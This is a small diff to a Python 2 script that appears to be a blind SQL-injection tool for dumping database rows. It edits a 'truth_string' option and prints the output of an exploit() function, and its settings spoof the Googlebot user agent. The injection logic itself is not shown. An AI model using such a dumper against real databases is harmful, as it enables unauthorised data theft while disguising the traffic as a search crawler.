@@ -11,7 +11,7 @@ options = {
     "user_agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
     "table_name": "",
     "columns": "col1,col2",
-    "truth_string": ""
+    "truth_string": "0"
 }
 
 # Here we store our dumped rows.
@@ -127,4 +127,4 @@ def exploit():
     return dump
 
 if __name__ == "__main__":
-    exploit()
+    print exploit()
